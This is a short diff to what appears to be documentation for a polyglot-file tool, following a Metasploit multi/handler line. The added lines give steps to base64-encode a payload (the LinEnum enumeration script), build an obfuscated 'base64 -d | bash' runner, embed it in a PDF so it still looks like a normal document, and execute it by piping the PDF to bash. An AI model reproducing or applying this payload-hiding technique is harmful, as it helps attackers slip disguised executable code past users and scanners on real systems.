@@ -83,12 +83,20 @@ msf5 exploit(multi/handler) > exploit
 ```
 # Example de polyglot in PDF
 
-# base64 payload.sh (example linenum.sh)
 
-# Create b64.sh
-# echo "code in base64 of linenum.sh" | base64 -d | bash
 
-#python3 powerglot -o script.sh file.pdf file-1.pdf
+# Create b64.sh with your favourite payload
+base64 Linenum.sh -w 0 > b64.sh
+# Edit b64.sh
+echo "code in b64.sh" | base64 -d | bash;
+
+# python3 powerglot -o b64.sh sample.pdf test.pdf
+# file test.pdf
+# xpdf test.pdf
+
+# Execute payload
+# cat test.pdf | bash or chmod +x test.pdf; ./test.pdf
+
 
 
 ```
